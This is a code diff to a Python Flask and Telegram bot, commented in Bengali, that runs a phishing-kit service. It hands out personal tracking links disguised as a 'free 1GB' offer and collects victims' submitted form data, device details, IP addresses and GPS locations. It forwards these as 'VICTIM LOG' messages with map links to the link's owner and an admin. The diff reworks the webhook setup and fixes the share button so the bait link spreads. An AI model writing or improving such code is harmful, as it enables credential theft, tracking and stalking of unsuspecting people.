@@ -4,7 +4,7 @@ import os
 import re
 from flask import Flask, request, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler, ExtBot
 import aiohttp
 
 # --- কনফিগারেশন ---
@@ -20,6 +20,11 @@ OWNER_USERNAME = "https://t.me/TheSagorOfficial"
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
+# --- টেলিগ্রাম বট এবং অ্যাপ্লিকেশন সেটআপ ---
+# Bot এবং Application অবজেক্ট বিশ্বব্যাপী তৈরি করা হচ্ছে
+bot = Bot(token=TOKEN)
+application = Application.builder().bot(bot).build()
+
 # Flask অ্যাপ ইনিশিয়ালাইজেশন
 app = Flask(__name__)
 
@@ -30,7 +35,6 @@ async def handle_data():
         data = await request.get_json()
         logger.info(f"Received data packet: {data}")
         
-        # শিকারের আসল আইপি অ্যাড্রেস বের করা
         if request.headers.getlist("X-Forwarded-For"):
             victim_ip = request.headers.getlist("X-Forwarded-For")[0]
         else:
@@ -38,7 +42,6 @@ async def handle_data():
         
         logger.info(f"Victim IP identified as: {victim_ip}")
 
-        # ব্যাকগ্রাউন্ডে ডেটা প্রসেসিং শুরু করা
         asyncio.create_task(process_victim_data(data, victim_ip))
         
         return jsonify({"status": "success", "message": "Data received"}), 200
@@ -46,6 +49,33 @@ async def handle_data():
         logger.error(f"Error in handle_data: {e}")
         return jsonify({"status": "error", "message": "Internal server error"}), 500
 
+# --- টেলিগ্রাম আপডেটের জন্য Webhook রুট ---
+@app.route('/telegram', methods=['POST'])
+async def telegram_webhook():
+    try:
+        update_data = await request.get_json()
+        update = Update.de_json(update_data, bot)
+        await application.process_update(update)
+        return jsonify({"status": "ok"}), 200
+    except Exception as e:
+        logger.error(f"Error in telegram_webhook: {e}")
+        return jsonify({"status": "error"}), 500
+
+# --- Webhook সেট করার জন্য একটি রুট (ঐচ্ছিক কিন্তু সুবিধাজনক) ---
+@app.route('/set_webhook', methods=['GET'])
+async def set_webhook():
+    webhook_url = f"{RENDER_APP_URL}/telegram"
+    try:
+        await bot.set_webhook(url=webhook_url)
+        message = f"Webhook successfully set to: {webhook_url}"
+        logger.info(message)
+        return jsonify({"status": "success", "message": message}), 200
+    except Exception as e:
+        error_message = f"Failed to set webhook: {e}"
+        logger.error(error_message)
+        return jsonify({"status": "error", "message": error_message}), 500
+
+# --- IP বিবরণ পাওয়ার ফাংশন ---
 async def get_ip_details(ip):
     try:
         async with aiohttp.ClientSession() as session:
@@ -56,8 +86,8 @@ async def get_ip_details(ip):
         logger.error(f"Failed to get IP details for {ip}: {e}")
     return {}
 
+# --- শিকারের ডেটা প্রসেস করার ফাংশন ---
 async def process_victim_data(data, victim_ip):
-    bot = Bot(token=TOKEN)
     student_id = data.get('student_id', 'unknown')
     form_data = data.get('form_data', {})
     device_info = data.get('device_info', {})
@@ -69,7 +99,6 @@ async def process_victim_data(data, victim_ip):
     if 'lat' in location_info and 'lon' in location_info:
         location_link = f"https://www.google.com/maps?q={location_info['lat']},{location_info['lon']}"
 
-    # --- অ্যাডমিনের জন্য মেসেজ তৈরি ---
     admin_message = f"""
 [student_id={student_id}]
 💀 ***====[ VICTIM LOG | @TheSagorOfficial ]====*** 💀
@@ -121,7 +150,13 @@ async def start_command(update: Update, context: CallbackContext) -> None:
     await update.message.reply_text(welcome_message, reply_markup=reply_markup)
 
 async def create_link_handler(update: Update, context: CallbackContext) -> None:
-    user_id = update.effective_user.id
+    query = update.callback_query
+    if query:
+        await query.answer() # Callback query-র উত্তর দেওয়া জরুরি
+        user_id = query.from_user.id
+    else:
+        user_id = update.message.from_user.id
+
     personal_link = f"{PHISHING_SITE_URL}?id={user_id}"
     message_text = (
         "🎉 𝗬𝗼𝘂𝗿 𝗨𝗻𝗶𝗾𝘂𝗲 𝗧𝗿𝗮𝗰𝗸𝗶𝗻𝗴 𝗟𝗶𝗻𝗸 𝗶𝘀 𝗥𝗲𝗮𝗱𝘆! 🎉\n\n"
@@ -136,15 +171,16 @@ async def create_link_handler(update: Update, context: CallbackContext) -> None:
         f"👉𝗚𝗲𝘁 Your 𝗙𝗿𝗲𝗲 𝟭𝗚𝗕\n👉{personal_link}\n\n"
         "Don't wait, 𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝘁𝗶𝗺𝗲 𝗼𝗳𝗳𝗲𝗿!"
     )
-    telegram_share_url = f"https://t.me/share/url?url=&text={share_text.replace(' ', '%20').replace(' ', '%0A')}"
+    telegram_share_url = f"https://t.me/share/url?url={personal_link}&text={share_text.replace(' ', '%20').replace(' ', '%0A')}"
     keyboard = [
         [InlineKeyboardButton("Share this with friends", url=telegram_share_url)],
         [InlineKeyboardButton("My another Channel", url=CHANNEL_LINK)],
         [InlineKeyboardButton("Contact owner if any issue", url=OWNER_USERNAME)]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    if update.callback_query:
-        await update.callback_query.edit_message_text(text=message_text, reply_markup=reply_markup, parse_mode='Markdown')
+    
+    if query:
+        await query.edit_message_text(text=message_text, reply_markup=reply_markup, parse_mode='Markdown')
     else:
         await update.message.reply_text(text=message_text, reply_markup=reply_markup, parse_mode='Markdown')
 
@@ -166,33 +202,11 @@ async def message_filter(update: Update, context: CallbackContext) -> None:
         logger.error(f"Failed to forward log to student {student_id}: {e}")
         await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"⚠️ **Failed to deliver log to student `{student_id}`.** They might have blocked the bot.", parse_mode='Markdown')
 
-# --- মূল সেটআপ এবং রান ফাংশন ---
-async def main():
-    bot = Bot(TOKEN)
-    application = Application.builder().bot(bot).build()
+# --- হ্যান্ডলারগুলো application-এ যোগ করা ---
+application.add_handler(CommandHandler("start", start_command))
+application.add_handler(CommandHandler("create", create_link_handler))
+application.add_handler(CallbackQueryHandler(create_link_handler, pattern='^create_link$'))
+application.add_handler(MessageHandler(filters.TEXT | filters.PHOTO, message_filter))
 
-    # কমান্ড এবং বাটন হ্যান্ডলার
-    application.add_handler(CommandHandler("start", start_command))
-    application.add_handler(CommandHandler("create", create_link_handler))
-    application.add_handler(CallbackQueryHandler(create_link_handler, pattern='^create_link$'))
-    application.add_handler(MessageHandler(filters.TEXT | filters.PHOTO, message_filter))
-
-    # Webhook সেট করা
-    await application.bot.set_webhook(url=f"{RENDER_APP_URL}/telegram")
-    
-    # Flask অ্যাপকে application-এর সাথে সংযুক্ত করা
-    async with application:
-        await application.start()
-        # Flask অ্যাপটি একটি ভিন্ন থ্রেডে বা async-compatible সার্ভারে চালানো উচিত
-        # কিন্তু Render-এর জন্য, gunicorn এটি সামলে নেবে।
-        # এখানে আমরা শুধু টেলিগ্রাম application চালু রাখছি।
-        # gunicorn bot:app কমান্ডটি Flask অ্যাপটি চালাবে।
-        logger.info("Telegram bot application started, waiting for gunicorn to serve Flask app.")
-        await application.updater.start_polling() # লোকাল টেস্টিং এর জন্য
-        # await application.run_until_disconnected() # ডেপ্লয়মেন্টের জন্য
-
-if __name__ == '__main__':
-    # এই অংশটি এখন gunicorn দ্বারা চালিত হবে, সরাসরি নয়।
-    # তবে লোকাল টেস্টিং এর জন্য এটি রাখা যেতে পারে।
-    # asyncio.run(main())
-    pass
+# --- Gunicorn এই ফাইলটি চালালে __name__ হবে 'freemb_controller_bot' বা অনুরূপ ---
+# __name__ == '__main__' ব্লকটি এখানে আর প্রয়োজন নেই কারণ Gunicorn সরাসরি 'app' অবজেক্টটি ব্যবহার করে।
